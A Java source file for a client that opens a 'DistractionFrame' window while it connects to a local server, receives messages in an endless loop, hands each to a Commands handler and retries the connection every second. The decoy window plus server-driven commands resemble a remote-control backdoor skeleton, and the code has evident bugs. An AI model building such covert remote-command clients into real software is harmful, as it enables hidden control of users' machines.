import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;
import java.util.*;
import java.util.concurrent.TimeUnit;

import javax.swing.Timer;


public class Client implements ActionListener{


	private String id = "User: ";
	private int port = 1201;
	private String serverName = "127.0.0.1";
	private Talker talk;
	private Timer timer;
	private int reconnect = 1;
	private String message = " I am from user";

	
	
	public Client() throws Throwable{

		new DistractionFrame();

			//Initial Attempt To Connect To Server
		new Thread(new Runnable()
		{
		     public void run()
		     {
		          try {
					connectTalker();
				} catch (Throwable e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
		     }
		}).start();
		
			talk.send(message);
			talk.recieve(id);

			
			// Creation of timer to attempt re-connection to Server every minute
			reconnect = reconnect * (1000);
			System.out.println(reconnect + " millis between checks \n\n");
			timer = new Timer(reconnect, (ActionListener) this);
			timer.setActionCommand("Start Timer");
			timer.setRepeats(true);
			timer.start();
			System.out.println("After start");
			
	}

@Override
public void actionPerformed(ActionEvent e){

	String cmd;
	cmd = e.getActionCommand();
	
	// for every N minutes attempt to Connect to Server
	if(cmd.equals("Start Timer")){
		
		try {
			
			connectTalker();
			
		} catch (Throwable e1) {
			
			System.out.println("Either already connected or unable to connect");
		}
		
	}
	
	
	
}// end ActionhandleCommands

public void connectTalker() throws Throwable
{
	try
	{
		talk = new Talker(serverName, port, id);
		while(true)
		{
			message = talk.recieve(id);
			//talk.send(id);
			new Commands(message);
			
		}
	}
	catch (IOException e) {
		e.printStackTrace();
	}
}


public static void main(String[] args) throws Throwable{
	
	new Client();

	}// end main
	
}// end class